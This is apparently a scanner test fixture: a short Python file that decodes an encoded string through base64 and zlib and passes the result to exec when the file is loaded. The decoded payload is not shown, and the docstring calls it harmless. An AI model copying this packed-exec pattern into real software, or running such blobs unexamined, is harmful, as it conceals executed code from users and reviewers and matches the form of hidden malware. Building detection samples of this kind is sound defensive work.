"""Harmless fixture: Multi-layer packing (Base64 -> zlib -> XOR loop -> exec)."""

__obfuscated_by__ = 'https://pyobfuscate.com'

import base64
import zlib

_encoded_layer = (
    'eJxdkMGKAjEQRO9+RR0V6pCeOJ3ksF8iLjg6wsKyyroH/ful0iOCENLdqepHd66Hx/flcMIHpsfffFvvJnwi3'
    'XPB+fKLCV8/2BUjvBFtS9RGeCGyEeaEWSXciZrDIHHIRJW5Ei0RAjQj6hB6HQjL4ZOufunSxOheJ0pdelp4FV'
    'U/2T6+9P4u5hiDZXE15FB0JcJSItqCsrREJ7TGlrAxugWMTCP0o2LsWfcLm9QcWG33jl3cEdz2+81qvs/H9TX'
    '+e7P6B8l7Slk='
)

exec(zlib.decompress(base64.b64decode(_encoded_layer)))
